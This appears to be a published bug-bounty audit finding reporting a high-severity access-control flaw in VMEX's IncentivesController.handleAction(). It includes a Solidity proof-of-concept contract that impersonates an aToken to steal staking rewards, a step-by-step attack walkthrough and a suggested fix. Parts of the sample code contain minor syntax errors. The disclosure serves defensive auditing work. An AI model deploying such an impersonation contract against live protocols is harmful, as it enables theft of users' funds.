# [H] Incorrect access control in `IncentivesController.handleAction()`

## Summary
Severity: High
Chain: Smart contract
Component: VMEX
Published: 2023-06-19
Source: https://github.com/hats-finance/VMEX-0x050183b53cf62bcd6c2a932632f8156953fd146f/issues/14
Type: hats-finding

## Details
**Github username:** @bahurum
**Submission hash (on-chain):** 0xa2e6ee3d3cf681e9d27a8968aecea25a6ccaae3ce0addf0856ad88ecc9cff19f
**Severity:** high severity

**Description:**
## Description
In `IncentivesController.handleAction()` it is not checked properly that `msg.sender` is indeed a valid `aToken`. This allows anyone to impersonate an `aToken` and steal rewards from the `IncentivesController`.

## Attack scenario:
The attacker will deploy a contract like this:

```solidity:
contract aTokenImpersonator {

    address public UNDERLYING_ASSET_ADDRESS;
    uint64 public _tranche;
    address incentivesController;

    constructor(address _underlying, uint64 _trancheId, address _ic) external {
        // attacker sets underlying and tranche of the aToken impersonated
        UNDERLYING_ASSET_ADDRESS = _underlying;
        _tranche = _trancheId;
        incentivesController = _ic;
    }

    function steal(
        uint256 totalSupply,
        uint256 oldBalance,
        uint256 newBalance,
    ) external {
        IncentivesController(incentivesController).handleAction(
            totalSupply,
            oldBalance,
            newBalance,
            DistributionTypes.Action.WITHDRAW
        );
    }

    function send() external {
        uint balance = IERC20(UNDERLYING_ASSET_ADDRESS).balanceOf(address(this));
        IERC20(UNDERLYING_ASSET_ADDRESS).transfer(msg.sender, balance);
    }

}
```

The attacker then:
1. Calls `aTokenImpersonator.steal()`
2. `aTokenImpersonator` calls [`IncentivesController.handleAction()`](https://github.com/hats-finance/VMEX-0x050183b53cf62bcd6c2a932632f8156953fd146f/blob/fb396a3fa412e643de7d8a1fd8a0268ab3a2f993/packages/contracts/contracts/protocol/incentives/IncentivesController.sol#LL67C12-L67C24)
3. In handleAction(), [`_updateIncentivizedAsset()`](https://github.com/hats-finance/VMEX-0x050183b53cf62bcd6c2a932632f8156953fd146f/blob/fb396a3fa412e643de7d8a1fd8a0268ab3a2f993/packages/contracts/contracts/protocol/incentives/DistributionManager.sol#L118) will execute doing nothing:
    ``` solidity
    assert(userBalance <= assetSupply); // will catch cases such as if userBalance and assetSupply were flipped
    DistributionTypes.IncentivizedAsset storage incentivizedAsset = _incentivizedAssets[asset];
    ```
    The attacker just needs to send `totalSupply >= oldBalance` to make the `assert` pass, and then `_incentivizedAssets[asset]` is an empty struct since `asset` is the address of the attacker contract itself, so `incentivizedAsset.numRewards` is zero and the for loop will be skipped.

4. Then [`stakingExists(msg.sender)`](https://github.com/hats-finance/VMEX-0x050183b53cf62bcd6c2a932632f8156953fd146f/blob/fb396a3fa412e643de7d8a1fd8a0268ab3a2f993/packages/contracts/contracts/protocol/incentives/ExternalRewardDistributor.sol#L38) will return `true` for the impersonated aToken:
   ```solidity
    function stakingExists(address aToken) internal view returns (bool) {
        address underlying = IAToken(aToken).UNDERLYING_ASSET_ADDRESS();
        uint64 trancheId = IAToken(aToken)._tranche();
        return stakingData[underlying][trancheId] != address(0);
    }
   ```
    `underlying` and `trancheId` will be the ones corresponding to the impersonated aToken, so `stakingData[underlying][trancheId]` will be non empty.

5. Then `onWithdraw()` will [withdraw the rewards](https://github.com/hats-finance/VMEX-0x050183b53cf62bcd6c2a932632f8156953fd146f/blob/fb396a3fa412e643de7d8a1fd8a0268ab3a2f993/packages/contracts/contracts/protocol/incentives/ExternalRewardDistributor.sol#LL125C20-L125C20) corresponding to the `underlying` and `trancheId`, and send them to the attacker contract.

6. The attacker calls `aTokenImpersonator.send()` to get the stolen rewards out of the `aTokenImpersonator` contract. 

# Recommendation
Check that the caller of `IncentivesController.handleAction()` is indeed an existing `aToken`. This could be done in `ExternalRewardsDistributor.stakingExists()` for example:
```diff
  function stakingExists(address aToken) internal view returns (bool) {
    address underlying = IAToken(aToken).UNDERLYING_ASSET_ADDRESS();
    uint64 trancheId = IAToken(aToken)._tranche();
+   if lendingPool.getReserveData(underlying, trancheId).aTokenAddress != aToken return false;
    return stakingData[underlying][trancheId] != address(0);
  }
```
